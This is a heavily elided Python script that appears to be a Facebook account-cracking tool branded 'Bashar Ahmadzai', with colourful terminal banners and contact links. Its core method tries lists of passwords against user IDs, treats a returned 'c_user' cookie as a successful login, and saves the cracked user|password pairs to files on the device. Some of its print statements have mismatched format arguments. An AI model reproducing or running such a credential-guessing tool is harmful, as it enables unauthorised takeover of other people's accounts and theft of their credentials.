...
\033[92;1mY8888P' YP   YD Y888888P VP   V8P  Y888P  
        ...
        \033[1;92m༄𝐵𝑎𝑠𝒉𝑎𝑟᭄•───────────────────────────────────────•༄𝐴𝒉𝑚𝑎𝑑𝑧𝑎𝑖᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : Bashar            \033[1;93m▇▇
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/Bashar-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/Bashar-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : 𝐵𝑎𝑠𝒉𝑎𝑟 𝐴𝒉𝑚𝑎𝑑𝑧𝑎𝑖")
			print ('\033[1;92m༄𝐵𝑎𝑠𝒉𝑎𝑟᭄•───────────────────────────────────────•༄𝐴𝒉𝑚𝑎𝑑𝑧𝑎𝑖᭄')
			key = input(" [*] Choose : ")
			print ('༄𝐵𝑎𝑠𝒉𝑎𝑟᭄•───────────────────────────────────────•༄𝐴𝒉𝑚𝑎𝑑𝑧𝑎𝑖᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[𝐵𝑎𝑠𝒉𝑎𝑟]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [𝐵𝑎𝑠𝒉𝑎𝑟-𝑜𝑘🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/𝐵𝑎𝑠𝒉𝑎𝑟_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/𝐵𝑎𝑠𝒉𝑎𝑟_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+93782989190")
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/afghanhalak002")
